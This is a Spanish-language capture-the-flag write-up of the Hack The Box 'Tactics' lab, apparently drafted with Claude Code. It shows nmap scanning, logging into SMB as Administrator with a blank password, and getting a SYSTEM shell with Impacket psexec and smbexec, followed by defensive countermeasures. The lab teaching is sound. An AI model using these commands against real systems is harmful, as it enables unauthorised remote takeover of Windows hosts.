---
title: Tactics (HTB Starting Point)
date: 2026-06-15
tags: [ciberseguridad, htb, starting-point, pentesting, smb, windows, impacket, credenciales-debiles]
type: nota
status: en-progreso
source: claude-code
aliases: [Tactics HTB, HTB Tactics, smb-psexec-tactics]
---

# Tactics — HTB Starting Point (Tier 1)

**Tier 1 · SO: Windows · Dificultad: Very Easy · Skills: SMB enumeration, Impacket psexec/smbexec, Windows remote execution**

Tactics expone el patrón más clásico de movimiento lateral en redes Windows: una cuenta administrativa con credencial débil (contraseña en blanco) y SMB abierto. Con Impacket se obtiene una shell SYSTEM sin explotar ningún CVE, solo abusando de la configuración. Es un laboratorio legal y autorizado de Hack The Box, diseñado explícitamente para aprender estas técnicas en un entorno seguro.

---

## Objetivo

Obtener ejecución remota en la máquina Windows como SYSTEM a través de SMB, usando credenciales del administrador local, y leer la flag.

---

## Acceso a la maquina (paso previo)

Antes de atacar nada necesitas conectarte a la red de HTB y arrancar la maquina para obtener su **IP**:

1. **Descarga tu VPN** desde el panel de HTB (Starting Point -> *Connect* -> descarga el `.ovpn`).
2. **Conectate a la VPN** y dejala corriendo en una terminal aparte:
   ```bash
   sudo openvpn starting_point_<tu_usuario>.ovpn
   ```
3. **Lanza la maquina** en la web (boton *Spawn Machine*). HTB te dara una **IP** (tipo `10.129.x.x`).
4. Comprueba que llegas a ella:
   ```bash
   ping -c2 <IP>
   ```
5. En el resto de este writeup, **sustituye `<IP>` por la IP que te toque** (es dinamica: cambia cada vez que lanzas la maquina).

> Alternativa sin VPN: el **Pwnbox** (Kali en el navegador que ofrece HTB) ya viene conectado a la red; solo lanzas la maquina y usas su IP directamente.

## Reconocimiento

**Categoría: escaneo de puertos y detección de servicio.**

```bash
nmap -sV -sC -Pn <IP>
```

Flags clave:
- `-sV` — detección de versión de servicio
- `-sC` — scripts por defecto (incluye enumeración SMB básica)
- `-Pn` — salta el ping (necesario en muchos hosts Windows que bloquean ICMP)

Lo que revela nmap:
- **Puerto 445/tcp** abierto → SMB (Server Message Block)
- Posiblemente **135** (RPC) y **139** (NetBIOS) también abiertos
- El hostname y el dominio de la máquina (si está unida a un AD, lo indica; en este caso es un workgroup)

```
445/tcp open  microsoft-ds?
```

El escaneo por sí solo no dice "credencial débil", pero confirma que SMB está expuesto y que la máquina es Windows — suficiente para proceder a enumerar.

---

## Enumeracion

**Categoría: listado de recursos compartidos SMB (shares) sin credenciales o con cuenta conocida.**

Primero se prueba si el servidor responde sin credenciales (null session) o con usuario `Administrator` y contraseña vacía:

```bash
smbclient -L //<IP>/ -U Administrator
```

Cuando te pida contraseña, pulsa Enter (contraseña vacía). Si la autenticación funciona, verás los shares disponibles:

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
```

Los shares `ADMIN$` y `C$` son **admin shares** de Windows, accesibles solo a administradores. El hecho de que se listen confirma que la cuenta `Administrator` tiene acceso administrativo completo y sin contraseña.

> Si `smbclient` devuelve "NT_STATUS_LOGON_FAILURE", la contraseña vacía no funciona — ajusta la credencial contra la máquina en vivo (prueba `guest` o credenciales que hayas encontrado en etapas anteriores del Starting Point).

---

## Acceso inicial (foothold)

**Categoría: ejecución remota vía SMB con Impacket psexec — abuso de admin shares.**

Impacket `psexec.py` replica el comportamiento de PsExec de Sysinternals: sube un ejecutable al share `ADMIN$`, crea un servicio Windows para ejecutarlo, y devuelve una shell interactiva. El resultado es una sesión con privilegios **SYSTEM**.

```bash
impacket-psexec Administrator@<IP>
```

O con el binario directo si tienes Impacket instalado desde fuente:

```bash
python3 /usr/share/doc/python3-impacket/examples/psexec.py Administrator@<IP>
```

Cuando pida contraseña: Enter (vacía).

Si `psexec.py` falla por restricciones de escritura en `ADMIN$`, prueba `smbexec.py`, que ejecuta comandos vía el servicio `svcctl` sin subir un binario al disco:

```bash
impacket-smbexec Administrator@<IP>
```

Al conectar obtienes un prompt de shell:

```
C:\Windows\system32>whoami
nt authority\system
```

Eres SYSTEM. No se necesita escalada de privilegios.

---

## Escalada de privilegios

No requiere privesc: el foothold con `psexec.py` / `smbexec.py` entrega directamente una sesión **SYSTEM**, el nivel más alto de privilegio en Windows. La flag se obtiene desde esa misma shell.

---

## Flags

Tactics es una máquina Starting Point con **una sola flag** (no hay separación user/root en muchas SP de Tier 1).

Localización típica:

```powershell
type C:\Users\Administrator\Desktop\flag.txt
```

O si hay estructura user/root:

```powershell
# User flag
type C:\Users\<usuario>\Desktop\user.txt

# Root/Admin flag
type C:\Users\Administrator\Desktop\root.txt
```

Valor: `<flag>` (lo obtienes en la sesión SYSTEM de la máquina real).

---

## Patron y teoria

### El patron: acceso administrativo por SMB con credencial débil

**Esquema general:**

```
Atacante
  └─► Puerto 445 (SMB) abierto
        └─► Cuenta administrativa con contraseña vacía/débil
              └─► Admin shares accesibles (ADMIN$, C$)
                    └─► Impacket psexec → shell SYSTEM
```

Este patrón se llama **Pass-the-Hash / Lateral Movement via SMB** en su variante más sencilla (aquí ni siquiera hace falta hash, la contraseña es vacía). En entornos reales aparece cuando:

1. Un administrador dejó la contraseña por defecto en una imagen de despliegue.
2. La cuenta `Administrator` local no fue deshabilitada (buena práctica: desactivarla y usar cuentas nominativas).
3. SMB no está restringido por firewall interno.

### Por qué psexec funciona: anatomía del ataque

`psexec.py` hace tres cosas en secuencia:
1. **Autenticación SMB** con las credenciales dadas.
2. **Escritura de un servicio ejecutable** en `ADMIN$` (mapea a `C:\Windows\`).
3. **Creación y arranque de un servicio Windows** vía RPC (`svcctl`) que ejecuta ese binario y conecta stdin/stdout al atacante.

El proceso resultante hereda el contexto del Service Control Manager → **SYSTEM**.

`smbexec.py` es más sigiloso: no escribe un binario, ejecuta comandos mediante `cmd.exe /Q /c <comando>` a través del mismo canal RPC.

### Defensa y diseño seguro (clave dev/purple team)

| Problema | Contramedida |
|---|---|
| Contraseña vacía/débil en Administrator | Password policy: mínimo 12 chars, complejidad, rotación; bloqueo de cuentas |
| Cuenta `Administrator` local activa | Desactivarla; usar LAPS (Local Administrator Password Solution) para gestionar contraseñas locales únicas por máquina |
| SMB expuesto en la red | Firewall: bloquear 445/139 entre segmentos que no lo necesiten; nunca exponer SMB a Internet |
| Admin shares (`ADMIN$`, `C$`) accesibles | Deshabilitar admin shares si no son necesarios (`AutoShareServer = 0` en el registro); restringir con ACLs |
| Sin detección de movimiento lateral | SIEM: alertas sobre eventos 4624 (logon type 3 + share `ADMIN$`), 7045 (nuevo servicio instalado), accesos a `C$` |

**Regla de diseño para devs:** cualquier servicio/aplicación que despliegues en Windows debe correr con una cuenta de servicio de mínimo privilegio, nunca con `Administrator` ni con contraseña vacía. Usa Managed Service Accounts (gMSA) en entornos de dominio.

---

## Conexiones

- [[HTB_Starting_Point/00_README]]
- [[MOC_Ciberseguridad]]
- [[12-aprender-y-carrera]]
- [[06-seguridad-de-sistemas-y-hardening]]
